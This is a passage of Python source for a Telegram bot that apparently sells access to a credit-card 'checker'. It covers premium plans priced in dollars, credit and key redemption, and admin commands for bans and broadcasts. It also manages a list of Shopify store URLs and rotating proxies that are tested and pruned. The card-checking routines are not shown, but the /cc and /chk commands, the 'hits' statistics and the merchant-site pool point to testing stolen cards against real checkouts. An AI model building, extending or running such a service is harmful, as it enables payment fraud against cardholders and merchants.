        text += f"\n\n<b>💎 Premium Access Active!</b>\n<b>📋 Plan:</b> {plan_name}\n<b>💰 Credits Available:</b> {credits}\n<b>📅 Expires:</b> {expiry_str}"
    else:
        text += f"\n\n<b>⚠️ Premium required for /cc and /chk commands</b>\n<b>💰 Credits Available:</b> {credits}"
    
    if is_adm:
        text += """\n<b>🔑 ADMIN COMMANDS</b>
<blockquote>➡️ /filter - Set site price filter
➡️ /addpremium user_id plan_name - Add premium with plan
➡️ /addpremiumcustom user_id days credits - Add custom premium
➡️ /removepremium user - Remove premium
➡️ /addcredits user amount - Add credits to user
➡️ /removecredits user amount - Remove credits from user
➡️ /genpremiumkey amount plan - Generate premium keys
➡️ /gencreditkey amount credits - Generate credit-only keys
➡️ /ban user - Ban user
➡️ /unban user - Unban user
➡️ /stats - Bot statistics
➡️ /allstats - Full stats with hit history
➡️ /userlist - List all premium users
➡️ /checkcredits user_id - Check user credits
➡️ /setcredits user_id amount - Set exact credits
➡️ /exportstats - Export full hit stats file
➡️ /activecheck - See who is checking now
➡️ /broadcast msg - Broadcast message to ALL users
➡️ /groupmode on/off - Enable/disable bot in current group</blockquote>"""
    
    text += f"\n\n<b>─────────────────────</b>\n🤖 <b>Bot By: <a href=\"tg://user?id=7415233736\">BUBU</a></b>"
    
    await event.reply(text, parse_mode='html')

@bot.on(events.CallbackQuery(pattern=b"check_joined"))
async def check_joined_callback(event):
    user_id = event.sender_id
    joined, _ = await check_user_joined(user_id)
    if joined:
        set_user_joined(user_id)
        await event.edit("✅ <b>Verification successful!</b>\n\nUse /start again to access the bot.", parse_mode='html')
    else:
        await event.answer("❌ You haven't joined all channels yet! Please join first.", alert=True)

@bot.on(events.NewMessage(pattern=r'^/info(@\w+)?(\s+.*)?$'))
async def info_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply("🚫 You are banned!", parse_mode='html')
    
    credits = get_user_credits(user_id)
    is_prem = is_premium(user_id)
    plan_name = get_user_plan_name(user_id)
    
    if is_prem:
        premium_data = load_premium_users().get(str(user_id), {})
        expiry = premium_data.get('expiry', 'Unknown')
        days_added = premium_data.get('days', 0)
        added_at = premium_data.get('added_at', 'Unknown')
        if expiry != 'Unknown':
            expiry_dt = datetime.fromisoformat(expiry)
            expiry_str = expiry_dt.strftime('%Y-%m-%d %H:%M:%S')
            days_left = (expiry_dt - datetime.now()).days
        else:
            expiry_str = 'Unknown'
            days_left = 0
        
        text = f"""<b>💎 YOUR ACCOUNT INFO 💎</b>
<b>─────────────────────</b>

<b>👤 User ID:</b> <code>{user_id}</code>
<b>⭐ Status:</b> <b>PREMIUM</b>
<b>📋 Plan:</b> {plan_name}
<b>💰 Credits:</b> {credits}
<b>📅 Premium Expires:</b> {expiry_str}
<b>⏱️ Days Left:</b> {days_left} days
<b>📆 Plan Duration:</b> {days_added} days
<b>🕐 Activated:</b> {added_at}

<b>─────────────────────</b>
💡 Use /plans to see available plans
💡 Contact @BUBU to recharge

🤖 <b>Bot By: <a href=\"tg://user?id=7415233736\">BUBU</a></b>"""
    else:
        text = f"""<b>⚠️ YOUR ACCOUNT INFO ⚠️</b>
<b>─────────────────────</b>

<b>👤 User ID:</b> <code>{user_id}</code>
<b>⭐ Status:</b> FREE USER
<b>📋 Plan:</b> FREE
<b>💰 Credits:</b> {credits}

<b>─────────────────────</b>
💎 Premium Required to use /cc and /chk
💡 Use /plans to see premium plans
💡 Use /redeem to activate premium key
💡 Use /redeemcredit to activate credit key

🤖 <b>Bot By: <a href=\"tg://user?id=7415233736\">BUBU</a></b>"""
    
    await event.reply(text, parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/plans(@\w+)?(\s+.*)?$'))
async def plans_command(event):
    text = """<b>💎 DARK PREMIUM PLANS 💎</b>
<b>─────────────────────</b>

<b>⭐ TRIAL</b>
➡️ 1 Day Access
➡️ 3,000 Credits
➡️ Price: 2$
<b>─────────────────────</b>

<b>🥉 BRONZE</b>
➡️ 3 Days Access
➡️ 8,000 Credits
➡️ Price: 4$
<b>─────────────────────</b>

<b>🥈 SILVER</b>
➡️ 7 Days Access
➡️ 14,000 Credits
➡️ Price: 8$
<b>─────────────────────</b>

<b>🥇 GOLD</b>
➡️ 14 Days Access
➡️ 20,000 Credits
➡️ Price: 12$
<b>─────────────────────</b>

<b>💎 PLATINUM</b>
➡️ 24 Days Access
➡️ 30,000 Credits
➡️ Price: 22$
<b>─────────────────────</b>

<b>💀 How to Purchase?</b>
Contact: <a href="tg://user?id=7415233736">BUBU</a>

<b>─────────────────────</b>
🤖 <b>Bot By: <a href="tg://user?id=7415233736">BUBU</a></b>"""
    await event.reply(text, parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/redeem(@\w+)?(\s+.*)?$'))
async def redeem_premium_key_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply("🚫 You are banned!", parse_mode='html')
    
    args = event.message.text.split()
    if len(args) != 2:
        return await event.reply("❌ Usage: <code>/redeem PREMIUM_KEY</code>", parse_mode='html')
    
    key = args[1].strip().upper()
    success, msg = redeem_premium_key(key, user_id)
    
    if success:
        credits = get_user_credits(user_id)
        await event.reply(f"✅ <b>{msg}</b>\n\n💰 Your Credits: {credits}", parse_mode='html')
    else:
        await event.reply(f"❌ <b>{msg}</b>", parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/redeemcredit(@\w+)?(\s+.*)?$'))
async def redeem_credit_key_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply("🚫 You are banned!", parse_mode='html')
    
    args = event.message.text.split()
    if len(args) != 2:
        return await event.reply("❌ Usage: <code>/redeemcredit CREDIT_KEY</code>", parse_mode='html')
    
    key = args[1].strip().upper()
    success, credits = redeem_credit_key(key, user_id)
    
    if success:
        total_credits = get_user_credits(user_id)
        await event.reply(f"✅ <b>Credit Key Redeemed!</b>\n\n💰 Added: {credits} credits\n💳 Total Credits: {total_credits}", parse_mode='html')
    else:
        await event.reply(f"❌ <b>{credits}</b>", parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/addpremium(@\w+)?(\s+.*)?$'))
async def add_premium_admin(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        return await event.reply("❌ <b>Admin only command!</b>", parse_mode='html')
    
    args = event.message.text.split()
    if len(args) != 3:
        await event.reply("❌ Usage: <code>/addpremium user_id plan_name</code>\n\n<u>Available Plans:</u>\n➡️ trial\n➡️ bronze\n➡️ silver\n➡️ gold\n➡️ platinum\n\nExample: <code>/addpremium 7415233736 platinum</code>", parse_mode='html')
        return
    
    try:
        target_id = int(args[1])
        plan_key = args[2].lower()
        
        if plan_key not in PLANS:
            await event.reply(f"❌ Invalid plan! Available: trial, bronze, silver, gold, platinum", parse_mode='html')
            return
        
        plan_info = PLANS[plan_key]
        days = plan_info['days']
        credits = plan_info['credits']
        
        add_premium_user(target_id, plan_key, days, credits)
        
        await event.reply(f"✅ <b>Premium added!</b>\n\n👤 User: <code>{target_id}</code>\n📋 Plan: {plan_info['name']}\n📅 Days: {days}\n💰 Credits: {credits}", parse_mode='html')
        
        try:
            expiry = datetime.now() + timedelta(days=days)
            await bot.send_message(target_id, f"🎉 <b>Premium Access Granted!</b>\n\n📋 Plan: {plan_info['name']}\n📅 You now have {days} days of premium access with {credits} credits!\n📆 Expires: {expiry.strftime('%Y-%m-%d')}\n\nUse /info to check your account.", parse_mode='html')
        except:
            pass
            
    except ValueError:
        await event.reply("❌ Invalid user_id!", parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/addpremiumcustom(@\w+)?(\s+.*)?$'))
async def add_premium_custom_admin(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        return await event.reply("❌ <b>Admin only command!</b>", parse_mode='html')
    
    args = event.message.text.split()
    if len(args) != 4:
        await event.reply("❌ Usage: <code>/addpremiumcustom user_id days credits</code>\n\nExample: <code>/addpremiumcustom 7415233736 15 5000</code>", parse_mode='html')
        return
    
    try:
        target_id = int(args[1])
        days = int(args[2])
        credits = int(args[3])
        
        if days <= 0 or credits <= 0:
            await event.reply("❌ Days and credits must be positive!", parse_mode='html')
            return
        
        add_premium_user(target_id, "custom", days, credits)
        
        await event.reply(f"✅ <b>Custom Premium added!</b>\n\n👤 User: <code>{target_id}</code>\n📅 Days: {days}\n💰 Credits: {credits}", parse_mode='html')
        
        try:
            expiry = datetime.now() + timedelta(days=days)
            await bot.send_message(target_id, f"🎉 <b>Premium Access Granted!</b>\n\n📅 You now have {days} days of premium access with {credits} credits!\n📆 Expires: {expiry.strftime('%Y-%m-%d')}\n\nUse /info to check your account.", parse_mode='html')
        except:
            pass
            
    except ValueError:
        await event.reply("❌ Invalid user_id, days, or credits!", parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/removepremium(@\w+)?(\s+.*)?$'))
async def remove_premium_admin(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        return await event.reply("❌ <b>Admin only command!</b>", parse_mode='html')
    
    args = event.message.text.split()
    if len(args) != 2:
        return await event.reply("❌ Usage: <code>/removepremium user_id</code>", parse_mode='html')
    
    try:
        target_id = int(args[1])
    except:
        return await event.reply("❌ Invalid user_id", parse_mode='html')
    
    premium_data = load_premium_users()
    if str(target_id) in premium_data:
        del premium_data[str(target_id)]
        save_premium_users(premium_data)
        await event.reply(f"✅ <b>Premium removed!</b>\n\nUser: <code>{target_id}</code>", parse_mode='html')
        try:
            await bot.send_message(target_id, f"⚠️ <b>Premium Access Removed!</b>\n\nYour premium access has been revoked.", parse_mode='html')
        except:
            pass
    else:
        await event.reply(f"❌ User <code>{target_id}</code> does not have premium", parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/addcredits(@\w+)?(\s+.*)?$'))
async def add_credits_admin(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        return await event.reply("❌ <b>Admin only command!</b>", parse_mode='html')
    
    args = event.message.text.split()
    if len(args) != 3:
        return await event.reply("❌ Usage: <code>/addcredits user_id amount</code>", parse_mode='html')
    
    try:
        target_id = int(args[1])
        amount = int(args[2])
    except:
        return await event.reply("❌ Invalid user_id or amount", parse_mode='html')
    
    add_credits(target_id, amount)
    new_total = get_user_credits(target_id)
    await event.reply(f"✅ <b>Credits Added!</b>\n\nUser: <code>{target_id}</code>\nAdded: {amount}\nNew Total: {new_total}", parse_mode='html')
    
    try:
        await bot.send_message(target_id, f"💰 <b>{amount} Credits Added!</b>\n\nYour new balance: {new_total} credits", parse_mode='html')
    except:
        pass

@bot.on(events.NewMessage(pattern=r'^/removecredits(@\w+)?(\s+.*)?$'))
async def remove_credits_admin(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        return await event.reply("❌ <b>Admin only command!</b>", parse_mode='html')
    
    args = event.message.text.split()
    if len(args) != 3:
        return await event.reply("❌ Usage: <code>/removecredits user_id amount</code>", parse_mode='html')
    
    try:
        target_id = int(args[1])
        amount = int(args[2])
    except:
        return await event.reply("❌ Invalid user_id or amount", parse_mode='html')
    
    remove_credits(target_id, amount)
    new_total = get_user_credits(target_id)
    await event.reply(f"✅ <b>Credits Removed!</b>\n\nUser: <code>{target_id}</code>\nRemoved: {amount}\nNew Total: {new_total}", parse_mode='html')
    
    try:
        await bot.send_message(target_id, f"⚠️ <b>{amount} Credits Removed!</b>\n\nYour new balance: {new_total} credits", parse_mode='html')
    except:
        pass

@bot.on(events.NewMessage(pattern=r'^/ban(@\w+)?(\s+.*)?$'))
async def ban_user_admin(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        return await event.reply("❌ <b>Admin only command!</b>", parse_mode='html')
    
    args = event.message.text.split()
    if len(args) != 2:
        return await event.reply("❌ Usage: <code>/ban user_id</code>", parse_mode='html')
    
    try:
        target_id = int(args[1])
    except:
        return await event.reply("❌ Invalid user_id", parse_mode='html')
    
    ban_user(target_id)
    await event.reply(f"✅ <b>User banned!</b>\n\nUser: <code>{target_id}</code>", parse_mode='html')
    
    try:
        await bot.send_message(target_id, f"🚫 <b>You have been banned!</b>\n\nYou can no longer use this bot.", parse_mode='html')
    except:
        pass

@bot.on(events.NewMessage(pattern=r'^/unban(@\w+)?(\s+.*)?$'))
async def unban_user_admin(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        return await event.reply("❌ <b>Admin only command!</b>", parse_mode='html')
    
    args = event.message.text.split()
    if len(args) != 2:
        return await event.reply("❌ Usage: <code>/unban user_id</code>", parse_mode='html')
    
    try:
        target_id = int(args[1])
    except:
        return await event.reply("❌ Invalid user_id", parse_mode='html')
    
    unban_user(target_id)
    await event.reply(f"✅ <b>User unbanned!</b>\n\nUser: <code>{target_id}</code>", parse_mode='html')
    
    try:
        await bot.send_message(target_id, f"✅ <b>You have been unbanned!</b>\n\nYou can now use the bot again.", parse_mode='html')
    except:
        pass

@bot.on(events.NewMessage(pattern=r'^/genpremiumkey(@\w+)?(\s+.*)?$'))
async def gen_premium_key_admin(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        return await event.reply("❌ <b>Admin only command!</b>", parse_mode='html')
    
    args = event.message.text.split()
    
    if len(args) == 3:
        try:
            amount = int(args[1])
            plan_key = args[2].lower()
            if plan_key not in PLANS:
                return await event.reply(f"❌ Invalid plan! Available: {', '.join(PLANS.keys())}, custom", parse_mode='html')
        except:
            return await event.reply("❌ Usage: <code>/genpremiumkey amount plan</code>\n\nExample: <code>/genpremiumkey 5 gold</code>", parse_mode='html')
        
        keys_generated = []
        days = PLANS[plan_key]['days']
        credits = PLANS[plan_key]['credits']
        for i in range(amount):
            key = generate_premium_key(plan_key, days, credits)
            keys_generated.append(key)
        
        plan = PLANS[plan_key]
        keys_text = "\n".join([f"➡️ <code>{k}</code>" for k in keys_generated])
        msg = f"""✅ <b>Premium Keys Generated Successfully!</b>

<b>📊 Summary:</b>
➡️ Quantity: {amount}
➡️ Plan: {plan['name']}
➡️ Days: {plan['days']}
➡️ Credits: {plan['credits']}
➡️ Price: {plan['price']} each

<b>🔑 Generated Keys:</b>
{keys_text}

<b>⚠️ Note:</b> Share these keys with users. They can redeem using <code>/redeem KEY</code>"""
        await event.reply(msg, parse_mode='html')
    
    elif len(args) == 5 and args[2].lower() == "custom":
        try:
            amount = int(args[1])
            days = int(args[3])
            credits = int(args[4])
            if amount <= 0 or days <= 0 or credits <= 0:
                raise ValueError
            if amount > 50:
                return await event.reply("❌ Maximum 50 keys at once!", parse_mode='html')
        except:
            return await event.reply("❌ Usage: <code>/genpremiumkey amount custom days credits</code>\n\nExample: <code>/genpremiumkey 5 custom 15 5000</code>", parse_mode='html')
        
        keys_generated = []
        for i in range(amount):
            key = generate_premium_key("custom", days, credits)
            keys_generated.append(key)
        
        keys_text = "\n".join([f"➡️ <code>{k}</code>" for k in keys_generated])
        msg = f"""✅ <b>Custom Premium Keys Generated Successfully!</b>

<b>📊 Summary:</b>
➡️ Quantity: {amount}
➡️ Days: {days} per key
➡️ Credits: {credits} per key

<b>🔑 Generated Keys:</b>
{keys_text}

<b>⚠️ Note:</b> Share these keys with users. They can redeem using <code>/redeem KEY</code>"""
        await event.reply(msg, parse_mode='html')
    
    else:
        await event.reply("❌ Usage:\n<code>/genpremiumkey amount plan</code>\nExample: <code>/genpremiumkey 5 gold</code>\n\nOR\n\n<code>/genpremiumkey amount custom days credits</code>\nExample: <code>/genpremiumkey 5 custom 15 5000</code>", parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/gencreditkey(@\w+)?(\s+.*)?$'))
async def gen_credit_key_admin(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        return await event.reply("❌ <b>Admin only command!</b>", parse_mode='html')
    
    args = event.message.text.split()
    
    if len(args) == 3:
        try:
            amount = int(args[1])
            credits = int(args[2])
            if amount <= 0 or credits <= 0:
                raise ValueError
            if amount > 50:
                return await event.reply("❌ Maximum 50 keys at once!", parse_mode='html')
        except:
            return await event.reply("❌ Usage: <code>/gencreditkey amount credits</code>\n\nExample: <code>/gencreditkey 5 5000</code>", parse_mode='html')
        
        keys_generated = []
        for i in range(amount):
            key = generate_credit_key(credits)
            keys_generated.append(key)
        
        keys_text = "\n".join([f"➡️ <code>{k}</code>" for k in keys_generated])
        msg = f"""✅ <b>Credit Keys Generated Successfully!</b>

<b>📊 Summary:</b>
➡️ Quantity: {amount}
➡️ Credits: {credits} per key

<b>🔑 Generated Keys:</b>
{keys_text}

<b>⚠️ Note:</b> Share these keys with users. They can redeem using <code>/redeemcredit KEY</code> to get {credits} credits only (no premium)!"""
        await event.reply(msg, parse_mode='html')
    
    else:
        await event.reply("❌ Usage: <code>/gencreditkey amount credits</code>\nExample: <code>/gencreditkey 5 5000</code>", parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/stats(@\w+)?(\s+.*)?$'))
async def stats_admin(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        return await event.reply("❌ <b>Admin only command!</b>", parse_mode='html')
    
    global ACTIVE_FILTER
    premium_data = load_premium_users()
    keys_data = load_keys()
    credit_keys_data = load_credit_keys()
    credits_data = load_credits()
    sites = load_sites()
    proxies = load_proxies()
    banned = load_banned_users()
    
    total_premium = len(premium_data)
    total_keys = len(keys_data)
    used_premium_keys = sum(1 for k in keys_data.values() if k.get('used', False))
    total_credit_keys = len(credit_keys_data)
    used_credit_keys = sum(1 for k in credit_keys_data.values() if k.get('used', False))
    total_sites = len(sites)
    total_proxies = len(proxies)
    total_banned = len(banned)
    total_credits = sum(credits_data.values())
    
    msg = f"<b>📊 Bot Statistics</b>\n\n"
    msg += f"<b>👥 Users:</b>\n"
    msg += f"➡️ Premium Users: {total_premium}\n"
    msg += f"➡️ Banned Users: {total_banned}\n\n"
    msg += f"<b>💰 Credits:</b>\n"
    msg += f"➡️ Total Credits Active: {total_credits}\n\n"
    msg += f"<b>🔑 Premium Keys:</b>\n"
    msg += f"➡️ Total Generated: {total_keys}\n"
    msg += f"➡️ Used: {used_premium_keys}\n"
    msg += f"➡️ Unused: {total_keys - used_premium_keys}\n\n"
    msg += f"<b>💎 Credit Keys:</b>\n"
    msg += f"➡️ Total Generated: {total_credit_keys}\n"
    msg += f"➡️ Used: {used_credit_keys}\n"
    msg += f"➡️ Unused: {total_credit_keys - used_credit_keys}\n\n"
    msg += f"<b>🌐 Data:</b>\n"
    msg += f"➡️ Sites: {total_sites}\n"
    msg += f"➡️ Proxies: {total_proxies}\n\n"
    msg += f"<b>🎯 Active Filter:</b> {SITE_FILTERS[ACTIVE_FILTER]['name']}\n\n"
    msg += f"🤖 <b>Bot By: <a href=\"tg://user?id=7415233736\">BUBU</a></b>"
    
    await event.reply(msg, parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/broadcast(@\w+)?(\s+.*)?$'))
async def broadcast_admin(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        return await event.reply("❌ <b>Admin only command!</b>", parse_mode='html')
    
    broadcast_msg = event.message.text.replace('/broadcast', '', 1).strip()
    if not broadcast_msg:
        return await event.reply("❌ Usage: <code>/broadcast message</code>", parse_mode='html')
    
    premium_users = load_premium_users()
    credits_users = load_credits()
    
    all_user_ids = set()
    
    for uid_str in premium_users.keys():
        all_user_ids.add(int(uid_str))
    
    for uid_str in credits_users.keys():
        all_user_ids.add(int(uid_str))
    
    for uid in joined_users:
        all_user_ids.add(uid)
    
    for aid in ADMIN_IDS:
        all_user_ids.add(aid)
    
    sent = 0
    failed = 0
    
    status_msg = await event.reply(f"🔄 Broadcasting to {len(all_user_ids)} users...", parse_mode='html')
    
    for uid in all_user_ids:
        try:
            await bot.send_message(uid, f"📢 <b>Broadcast from Admin</b>\n\n{broadcast_msg}", parse_mode='html')
            sent += 1
        except:
            failed += 1
        await asyncio.sleep(0.1)
    
    await status_msg.edit(f"✅ <b>Broadcast Complete!</b>\n\nSent: {sent}\nFailed: {failed}", parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/groupmode(@\w+)?(\s+.*)?$'))
async def groupmode_command(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        return await event.reply("❌ <b>Admin only command!</b>", parse_mode='html')
    
    if not event.is_group:
        return await event.reply("❌ <b>This command only works in groups!</b>", parse_mode='html')
    
    args = event.message.text.split()
    if len(args) < 2:
        return await event.reply("❌ Usage: <code>/groupmode on/off</code>", parse_mode='html')
    
    action = args[1].lower()
    chat_id = event.chat_id
    
    if action == 'on':
        set_group_enabled(chat_id, True)
        await event.reply("✅ <b>Bot enabled in this group!</b>\n\nUsers can now use /cc for free checking.", parse_mode='html')
    elif action == 'off':
        set_group_enabled(chat_id, False)
        await event.reply("✅ <b>Bot disabled in this group!</b>", parse_mode='html')
    else:
        await event.reply("❌ Usage: <code>/groupmode on/off</code>", parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/filter(@\w+)?(\s+.*)?$'))
async def filter_command(event):
    global ACTIVE_FILTER
    user_id = event.sender_id
    if not is_admin(user_id):
        return await event.reply("❌ <b>Admin only command!</b>", parse_mode='html')
    
    args = event.message.text.split()
    if len(args) != 2:
        filters_text = "\n".join([f"➡️ <code>/{key}</code> - {val['name']}" for key, val in SITE_FILTERS.items()])
        await event.reply(f"<b>🎯 Site Price Filters</b>\n\n{filters_text}\n\n<b>Current Filter:</b> {SITE_FILTERS[ACTIVE_FILTER]['name']}\n\n<b>Usage:</b> <code>/filter under10</code>", parse_mode='html')
        return
    
    filter_key = args[1].lower()
    if filter_key not in SITE_FILTERS:
        await event.reply(f"❌ Invalid filter. Use: {', '.join(SITE_FILTERS.keys())}", parse_mode='html')
        return
    
    ACTIVE_FILTER = filter_key
    await event.reply(f"✅ <b>Filter Updated!</b>\n\nNow using: {SITE_FILTERS[ACTIVE_FILTER]['name']}", parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/site(@\w+)?(\s+.*)?$'))
async def site_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply("🚫 You are banned!", parse_mode='html')
    if not is_admin(user_id):
        return await event.reply("❌ <b>Admin only command!</b>", parse_mode='html')
    
    sites = load_sites()
    if not sites:
        return await event.reply("❌ `sites.txt` is empty. Nothing to check.", parse_mode='html')
    
    proxies = load_proxies()
    if not proxies:
        return await event.reply("❌ No proxies available. Please add proxies.", parse_mode='html')
    
    status_msg = await event.reply(f"🔄 Checking {len(sites)} sites...", parse_mode='html')
    
    alive_sites = []
    dead_sites = []
    batch_size = 10
    
    try:
        for i in range(0, len(sites), batch_size):
            batch = sites[i:i + batch_size]
            fresh_proxies = load_proxies()
            if not fresh_proxies:
                fresh_proxies = proxies
            
            tasks = [test_site(site, random.choice(fresh_proxies)) for site in batch]
            results = await asyncio.gather(*tasks)
            
            for res in results:
                if res['status'] == 'alive':
                    alive_sites.append(res['site'])
                else:
                    dead_sites.append(res['site'])
            
            await status_msg.edit(f"🔄 Checking sites...\n\n<b>Checked:</b> {len(alive_sites) + len(dead_sites)}/{len(sites)}\n<b>Alive:</b> {len(alive_sites)}\n<b>Dead:</b> {len(dead_sites)}", parse_mode='html')
        
        async with aiofiles.open(SITES_FILE, 'w') as f:
            for site in alive_sites:
                await f.write(f"{site}\n")
        
        summary_msg = f"✅ <b>Site Check Complete!</b>\n\n<b>Total Sites:</b> {len(sites)}\n<b>Alive:</b> {len(alive_sites)}\n<b>Removed:</b> {len(dead_sites)}\n\n<code>sites.txt</code> has been updated."
        
        await status_msg.edit(summary_msg, parse_mode='html')
        
    except Exception as e:
        await status_msg.edit(f"❌ An error occurred: {e}", parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/getsites(@\w+)?(?:\s|$)'))
async def get_sites_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply("🚫 You are banned!", parse_mode='html')
    
    if not os.path.exists(SITES_FILE):
        return await event.reply("❌ `sites.txt` file not found.", parse_mode='html')
    
    sites = get_file_lines(SITES_FILE)
    if not sites:
        return await event.reply("❌ `sites.txt` is empty.", parse_mode='html')
    
    total = len(sites)
    await event.reply(
        f"📄 <b>Sites File</b>\n\n📊 Total Sites: {total}\n\n✅ Sending <code>sites.txt</code> file...",
        file=SITES_FILE,
        parse_mode='html'
    )
@bot.on(events.NewMessage(pattern=r'^/addsite(@\w+)?(\s+)?'))
async def addsite_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply("🚫 You are banned!", parse_mode='html')
    if not is_admin(user_id):
        return await event.reply("❌ <b>Admin only command!</b>", parse_mode='html')
    
    args = event.message.text.split(maxsplit=1)
    if len(args) < 2:
        return await event.reply("❌ Usage: <code>/addsite https://example.myshopify.com</code>", parse_mode='html')
    
    site_url = args[1].strip()
    success, msg = add_site(site_url)
    
    if success:
        await event.reply(f"✅ {msg}\n\n🌐 <code>{site_url}</code>", parse_mode='html')
    else:
        await event.reply(f"❌ {msg}", parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/addsitetxt(@\w+)?(\s+)?'))
async def addsitetxt_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply("🚫 You are banned!", parse_mode='html')
    if not is_admin(user_id):
        return await event.reply("❌ <b>Admin only command!</b>", parse_mode='html')
    
    if not event.reply_to_msg_id:
        return await event.reply("❌ Reply to a <code>.txt</code> file with <code>/addsitetxt</code>", parse_mode='html')
    
    replied = await event.get_reply_message()
    if not replied.file:
        return await event.reply("❌ No file found. Reply to a .txt file!", parse_mode='html')
    
    if not replied.file.name.endswith('.txt'):
        return await event.reply("❌ Only .txt files supported!", parse_mode='html')
    
    status_msg = await event.reply("⏳ Downloading file...", parse_mode='html')
    
    file_path = f"sites_bulk_{user_id}.txt"
    await bot.download_media(replied, file_path)
    
    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        lines = [line.strip() for line in f if line.strip()]
    
    os.remove(file_path)
    
    added, already = add_sites_bulk(lines)
    
    msg = f"✅ <b>Sites Added!</b>\n\n➕ New: {len(added)}\n⏭️ Already existed: {len(already)}"
    if added:
        msg += f"\n\n<b>Added:</b>\n"
        for s in added[:10]:
            msg += f"🌐 {s}\n"
        if len(added) > 10:
            msg += f"and {len(added) - 10} more..."
    
    await status_msg.edit(msg, parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/rm(@\w+)?(\s+)?'))
async def rm_site_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply("🚫 You are banned!", parse_mode='html')
    if not is_admin(user_id):
        return await event.reply("❌ <b>Admin only command!</b>", parse_mode='html')
    
    args = event.message.text.split(maxsplit=1)
    if len(args) < 2:
        return await event.reply("❌ Usage: <code>/rm https://example.myshopify.com</code>", parse_mode='html')
    
    site_url = args[1].strip()
    success, msg = remove_site(site_url)
    
    if success:
        await event.reply(f"✅ {msg}\n\n🌐 Removed: <code>{site_url}</code>", parse_mode='html')
    else:
        await event.reply(f"❌ {msg}", parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/clearsite(@\w+)?(?:\s|$)'))
async def clear_site_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply("🚫 You are banned!", parse_mode='html')
    if not is_admin(user_id):
        return await event.reply("❌ <b>Admin only command!</b>", parse_mode='html')
    
    if not os.path.exists(SITES_FILE):
        return await event.reply("❌ `sites.txt` is already empty.", parse_mode='html')
    
    sites = get_file_lines(SITES_FILE)
    if not sites:
        return await event.reply("❌ `sites.txt` is already empty.", parse_mode='html')
    
    # Backup
    backup_file = f"sites_backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    with open(backup_file, 'w', encoding='utf-8') as f:
        for s in sites:
            f.write(f"{s}\n")
    
    # Clear
    with open(SITES_FILE, 'w', encoding='utf-8') as f:
        f.write('')
    
    await event.reply(f"✅ <b>Sites Cleared!</b>\n\n🗑️ Removed: {len(sites)} sites\n💾 Backup saved: <code>{backup_file}</code>", parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/proxy(@\w+)?(\s+)?'))
async def proxy_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply("🚫 You are banned!", parse_mode='html')
    if not is_admin(user_id):
        return await event.reply("❌ <b>Admin only command!</b>", parse_mode='html')
    
    proxies = load_proxies()
    if not proxies:
        return await event.reply("❌ `proxy.txt` is empty. Nothing to check.", parse_mode='html')
    
    status_msg = await event.reply(f"🔄 Checking {len(proxies)} proxies...", parse_mode='html')
    
    alive_proxies = []
    dead_proxies = []
    batch_size = 10
    
    try:
        for i in range(0, len(proxies), batch_size):
            batch = proxies[i:i + batch_size]
            tasks = [test_proxy(proxy) for proxy in batch]
            results = await asyncio.gather(*tasks)
            
            for res in results:
                if res['status'] == 'alive':
                    alive_proxies.append(res['proxy'])
                else:
                    dead_proxies.append(res['proxy'])
            
            await status_msg.edit(f"🔄 Checking proxies...\n\n<b>Checked:</b> {len(alive_proxies) + len(dead_proxies)}/{len(proxies)}\n<b>Alive:</b> {len(alive_proxies)}\n<b>Dead:</b> {len(dead_proxies)}", parse_mode='html')
        
        async with aiofiles.open(PROXY_FILE, 'w') as f:
            for proxy in alive_proxies:
                await f.write(f"{proxy}\n")
        
        summary_msg = f"✅ <b>Proxy Check Complete!</b>\n\n<b>Total Proxies:</b> {len(proxies)}\n<b>Alive:</b> {len(alive_proxies)}\n<b>Removed:</b> {len(dead_proxies)}\n\n<code>proxy.txt</code> has been updated."
        
        await status_msg.edit(summary_msg, parse_mode='html')
        
    except Exception as e:
        await status_msg.edit(f"❌ An error occurred: {e}", parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/addproxy(@\w+)?(?:\s|$)'))
async def addproxy_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply("🚫 You are banned!", parse_mode='html')
    if not is_admin(user_id):
        return await event.reply("❌ <b>Admin only command!</b>", parse_mode='html')
    
    # Get text after command (skip first line which is /addproxy)
    full_text = event.message.text
